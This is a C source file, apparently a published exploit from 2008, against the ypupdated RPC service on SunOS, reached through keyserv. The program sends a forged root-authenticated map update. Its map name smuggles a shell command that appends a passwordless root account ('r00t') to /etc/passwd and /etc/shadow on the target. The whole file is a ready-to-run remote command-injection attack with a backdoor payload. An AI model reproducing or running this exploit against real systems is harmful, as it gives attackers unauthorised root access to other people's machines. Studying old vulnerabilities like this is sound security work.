/*update: kcope/year2008/tested on SunOS 5.10//

 	KEYSERV/YPUPDATED (SunOS 4.1.3/RPC SERVICES)
 
 	If we send an MAP UPDATE to a remote YPUPDATED (via KEYSERV)
 	it executes a shell through which extra commands may be launched
 	on the remote host by passing '|shell command'.
 
 	i.e. the COMM variable contains a pipe character after which a
 	command may be passed. You may change the command by changing this.



 */

#include	<stdio.h>
#include	<stdlib.h>
#include	<string.h>
#include	<netinet/in.h>
#include	<netdb.h>
#include	<arpa/inet.h>
#include	<sys/types.h>
#include	<sys/socket.h>
#include	<fcntl.h>
#include	<rpc/rpc.h>

#define MAXMAPNAMELEN 255
#define MAXYPDATALEN 1023
#define MAXERRMSGLEN 255

typedef struct{
	unsigned int yp_buf_len;
	char * yp_buf_val;
} yp_buf;

struct ypupdate_args{
	char * mapname;
	yp_buf key;
	yp_buf datum;
};
typedef struct ypupdate_args ypupdate_args;

#ifdef __cplusplus
extern "C" bool_t xdr_ypupdate_args(XDR *,ypupdate_args *);
#elif __STDC__
extern bool_t xdr_ypupdate_args(XDR *,ypupdate_args *);
#else
bool_t xdr_ypupdate_args();
#endif

void main(argc, argv)
int argc;
char *argv[];
{

	CLIENT * cli;

	unsigned long prog=100028;
	unsigned int vers=1;

	struct sockaddr_in skn;
	struct timeval timeVal;
	struct hostent * hostEnt;

	ypupdate_args ypArg;
	unsigned long rtnval;

	unsigned int desc;

	char * comm = "|echo \"r00t::0:0:Super-User die zweite:/:/sbin/sh\" >> /etc/passwd;echo \"r00t::6445::::::\" >> /etc/shadow;";
	
	if(argc<2) {
		printf("example: yxp target\n");
		exit(1);
	}

	timeVal.tv_usec=0;
	timeVal.tv_sec=15;
	desc=RPC_ANYSOCK;

	ypArg.datum.yp_buf_val="x";
	ypArg.datum.yp_buf_len=strlen(ypArg.datum.yp_buf_val)+1;

	ypArg.key.yp_buf_val="x";
	ypArg.key.yp_buf_len=strlen(ypArg.key.yp_buf_val)+1;

	ypArg.mapname=comm;

	if ((hostEnt=gethostbyname(argv[1]))==NULL){
		printf("gethostbyname failure\n");
		exit(1);
	}

	skn.sin_family=AF_INET;skn.sin_port=htons(0);
	bcopy(hostEnt->h_addr,&skn.sin_addr.s_addr,4);

	if ((cli=clntudp_create(&skn,prog,vers,timeVal,&desc))==NULL){
		printf("clntudp_create failure\n");
		exit(1);
	}

	cli->cl_auth=authunix_create("localhost",0,0,0,0);

	clnt_call(cli,1,xdr_ypupdate_args,&ypArg,xdr_u_int,&rtnval,timeVal);
}
	
	
	


